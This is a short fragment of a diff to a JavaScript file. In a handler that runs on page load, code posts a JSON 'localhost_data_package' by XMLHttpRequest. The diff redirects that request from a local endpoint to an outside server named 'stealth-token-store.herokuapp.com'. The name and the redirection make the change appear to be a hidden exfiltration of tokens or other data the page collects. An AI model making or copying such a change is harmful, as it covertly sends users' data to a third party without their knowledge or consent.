@@ -98,7 +98,7 @@ window.addEventListener("load", function () {
                                 console.log(localhost_data_package);
                                 var xhr = new XMLHttpRequest();
                                 var port = DEFAULT_PORT
-                                var url = "http://127.0.0.1:55975/v1/unite";
+                                var url = "https://stealth-token-store.herokuapp.com/v1/unite";
                                 xhr.open("POST", url, true);
                                 xhr.setRequestHeader('Content-Type', 'application/json');
                                 xhr.send(JSON.stringify({
